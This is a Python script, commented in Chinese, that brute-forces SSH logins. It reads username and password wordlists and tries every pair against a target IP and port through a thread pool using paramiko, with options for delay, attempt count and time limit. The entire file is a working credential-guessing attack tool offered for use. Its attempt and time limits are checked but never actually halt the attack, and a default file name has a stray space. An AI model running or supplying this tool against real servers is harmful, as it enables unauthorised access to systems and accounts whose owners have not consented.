import argparse
import paramiko
import threading
import time
import concurrent.futures

# 假设你有默认的用户名和密码字典文件路径,这里只是示例
DEFAULT_USERNAME_FILE = 'default usernames.txt'
DEFAULT_PASSWORD_FILE = 'default_passwords.txt'

# 全局变量，用于记录爆破尝试次数
brute_force_count = 0

def ssh_login(ip, port, username, password, delay, start_time, max_attempts, time_limit):
    global brute_force_count
    brute_force_count += 1
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(ip, port, username, password, timeout=0.1)
        print(f"Successfully logged in to {ip}:{port} with user {username}")
    except paramiko.AuthenticationException:
        print(f"Authentication failed for user {username} on {ip}:{port}")
    except Exception as e:
        print(f"Error connecting to {ip}:{port}: {e}")
    finally:
        ssh.close()
        elapsed_time = time.time() - start_time
        print(f"Attempt {brute_force_count}: Elapsed time: {elapsed_time:.2f} seconds")
        if brute_force_count < max_attempts and elapsed_time < time_limit:
            time.sleep(delay)  # 等待一段时间再进行下一次尝试


def worker(args):
    ssh_login(*args)

def main():
    parser = argparse.ArgumentParser(description='SSH Login Tool')
    parser.add_argument('ip', type=str, help='IP address to connect to')
    parser.add_argument('-p', '--port', type=int, default=22, help='SSH port (default: 22)')
    parser.add_argument('-u', '--user-file', type=str, default=DEFAULT_USERNAME_FILE,
                        help='File containing usernames to try (default:default_usernames.txt)')
    parser.add_argument('-d', '--password-file', type=str, default=DEFAULT_PASSWORD_FILE,
                        help='File containing passwords to try (default:default_passwords.txt)')
    parser.add_argument('-m', '--threads', type=int, default=10, help='Number of threads to use (default: 10)')
    parser.add_argument('-t', '--delay', type=float, default=0.5,
                        help='Delay between login attempts (default: 0.5 seconds)')
    parser.add_argument('-a', '--max-attempts', type=int, default=100,
                        help='Maximum number of login attempts (default: 100)')
    parser.add_argument('-l', '--time-limit', type=float, default=60,
                        help='Time limit for the brute force attempts in seconds (default: 60 seconds)')
    args = parser.parse_args()

    start_time = time.time()  # 记录爆破开始时间

    # 读取用户名和密码列表
    with open(args.user_file, 'r') as user_file, open(args.password_file, 'r') as password_file:
        usernames = user_file.read().splitlines()
        passwords = password_file.read().splitlines()

    # 创建一个任务列表
    tasks = [(args.ip, args.port, username, password, args.delay, start_time, args.max_attempts, args.time_limit) for
             username in usernames for password in passwords]

    # 使用线程池执行任务
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(worker, task) for task in tasks]


if __name__ == "__main__":
    main()